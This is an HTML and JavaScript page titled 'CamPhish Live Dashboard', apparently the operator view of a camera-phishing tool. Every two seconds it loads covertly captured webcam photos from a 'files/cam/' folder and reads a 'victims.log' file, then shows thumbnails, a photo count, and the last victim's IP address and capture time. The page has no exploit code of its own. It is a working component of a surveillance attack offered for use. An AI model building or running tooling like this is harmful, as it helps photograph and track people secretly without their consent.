<!DOCTYPE html>
<html>
<head>
    <title>CamPhish Dashboard</title>
    <meta charset="UTF-8">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Courier New',monospace;background:#0a0a0a;color:#00ff00;padding:20px;overflow-x:auto}
        .container{max-width:1400px;margin:auto}
        h1{font-size:24px;margin-bottom:20px;color:#00ff88;text-shadow:0 0 10px #00ff88}
        .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:15px;margin:20px 0}
        .stat{background:linear-gradient(145deg,#1a1a1a,#0f0f0f);padding:20px;border-radius:10px;border:1px solid #333;text-align:center;box-shadow:0 5px 15px rgba(0,255,0,0.1)}
        .stat h2{font-size:32px;color:#00ff88;margin-bottom:5px}
        .files{background:#111;padding:20px;border-radius:10px;margin:20px 0;border:1px solid #333}
        .file-list{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:15px}
        .file-item{background:#1a1a1a;padding:15px;border-radius:8px;border:1px solid #444;transition:box-shadow 0.3s}
        .file-item:hover{box-shadow:0 0 20px rgba(0,255,0,0.3)}
        .file-name{font-size:12px;color:#aaa;margin-bottom:10px;word-break:break-all}
        .thumbnail{width:100%;max-width:150px;max-height:150px;border-radius:8px;cursor:pointer;border:2px solid #333}
        .thumbnail:hover{border-color:#00ff88}
        .logs{background:#000;padding:20px;border-radius:10px;margin:20px 0;border:1px solid #333;height:300px;overflow:auto;font-size:12px}
        .refresh-btn{background:#00ff88;color:#000;padding:10px 20px;border:none;border-radius:5px;cursor:pointer;font-weight:bold;margin:10px}
        .refresh-btn:hover{background:#00cc6a}
    </style>
</head>
<body>
    <div class="container">
        <h1>üïµÔ∏è‚Äç‚ôÇÔ∏è CamPhish Live Dashboard</h1>
        
        <button class="refresh-btn" onclick="loadAll()">üîÑ Refresh Now</button>
        
        <div class="stats">
            <div class="stat">
                <h2 id="total-captures">0</h2>
                <p>Total Photos</p>
            </div>
            <div class="stat">
                <h2 id="live-ip">-</h2>
                <p>Last IP</p>
            </div>
            <div class="stat">
                <h2 id="live-time">-</h2>
                <p>Last Capture</p>
            </div>
        </div>
        
        <div class="files">
            <h3>üì∏ Recent Captures (Click to Enlarge)</h3>
            <div class="file-list" id="file-list"></div>
        </div>
        
        <div class="logs">
            <h3>üìã Real-time Access Log</h3>
            <div id="log-content"></div>
        </div>
    </div>

    <script>
        let refreshInterval;

        function loadFiles() {
            fetch('files/cam/').then(r => r.text()).then(html => {
                const parser = new DOMParser();
                const doc = parser.parseFromString(html, 'text/html');
                const links = Array.from(doc.querySelectorAll('a')).filter(a => a.href.match(/\.jpg$/i));
                
                document.getElementById('total-captures').textContent = links.length;
                
                const container = document.getElementById('file-list');
                container.innerHTML = links.slice(-12).reverse().map(link => {
                    const name = link.textContent.trim();
                    return `
                        <div class="file-item">
                            <div class="file-name">${name}</div>
                            <img src="${link.href}" class="thumbnail" 
                                 onclick="window.open(this.src, '_blank')" 
                                 title="Click to view full size"
                                 onerror="this.style.display='none'">
                        </div>
                    `;
                }).join('');
            });
        }

        function loadLog() {
            fetch('victims.log?' + Date.now()).then(r => r.text()).then(log => {
                const lines = log.split('\n').filter(l => l.trim());
                const last = lines[lines.length - 2]?.match(/\[(.+?)\] (.+)/);
                
                if (last) {
                    document.getElementById('live-time').textContent = last[1];
                    document.getElementById('live-ip').textContent = last[2]?.split(' | ')[1]?.replace('IP: ', '') || '-';
                }
                
                document.getElementById('log-content').textContent = log;
                document.getElementById('log-content').scrollTop = document.getElementById('log-content').scrollHeight;
            });
        }

        function loadAll() {
            loadFiles();
            loadLog();
        }

        refreshInterval = setInterval(loadAll, 2000);
        loadAll();
    </script>
</body>
</html>
